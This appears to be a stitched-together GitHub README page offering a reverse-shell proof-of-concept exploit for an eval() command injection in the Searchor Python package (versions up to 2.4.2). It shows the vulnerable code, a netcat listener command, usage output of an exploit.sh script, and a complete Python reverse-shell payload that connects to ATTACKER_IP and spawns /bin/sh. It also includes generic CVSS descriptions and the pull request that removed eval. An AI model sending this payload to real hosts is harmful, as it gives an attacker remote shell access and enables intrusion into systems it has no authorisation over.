# POC exploit for Searchor <= 2.4.2 (2.4.0) (Arbitrary CMD Injection)

Reverse Shell POC exploit for **`Searchor <= 2.4.2 (2.4.0)`**

See for small details about the vulnerability [**here**](https://security.snyk.io/package/pip/searchor/2.4.0)

[**Link**](https://github.com/ArjunSharda/Searchor) for Github project of Searchor

## Small explanation

In file **`src/sarchor/main.py`** of **`Searchor <= 2.4.2`** there is a function call **`eval()`**:

```
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< See here
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
	  ...
```

Which can provide the ability to execute arbitrary code using functions such as:

* `__import__('os').system('<CMD>')`
* `__import__('os').popen('<CMD>').read()`
* `etc`

## PoC

Run the netcat on your host:

```
$ nc -lvnp 9001

```

Run the exploit (example) with default port **`9001`** on attacker host:

```
$ ./exploit.sh site.com 10.10.14.122
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is site.com
[*] Input attacker is 10.10.14.122:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection

```

Run the exploit (example) with the specified port **`1337`** on attacker host:

```
$ ./exploit.sh site.com 10.10.14.122 1337
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is site.com
[*] Input attacker is 10.10.14.122:1337
[*] Run the Reverse Shell... Press Ctrl+C after successful connection

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

# Searchor-2.4.0-POC-Exploit-

```
eval() Exploit POC for Searchor 2.4.2 and lower (2.4.0 as well) leading to Arbitrary Code Execution
vulnerability Reference: https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b

```

## Vulnerable code includes eval() method:

*url = eval(
f"Engine.{engine}.search('{query}', copy\_url={copy}, open\_web={open})"
)*

## If user parameter query is not sanitized it leads to RCE.

```
    Exploit code for linux target
    Prepare a listener: nc -lvnp PORT

```

## Send this as query parameter to the tested host

', exec("import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(('ATTACKER\_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

### @dan-pavlov **[dan-pavlov](/dan-pavlov)** commented [Oct 27, 2022](#issue-1425653104)

## What is this Pull Request About?

The simple change in this pull request replaces the execution of `search` method in the cli code from using `eval` to calling search on the specified engine by passing `engine` as an attribute of `Engine` class. Because enum in Python is a set of members, each being a key-value pair, the syntax for getting members is the same as passing a dictionary.

## What will this Pull Request Affect?

This pull request removes the use of `eval` in the cli code, achieving the same functionality while removing vulnerability of allowing execution of arbitrary code.

Sorry, something went wrong.
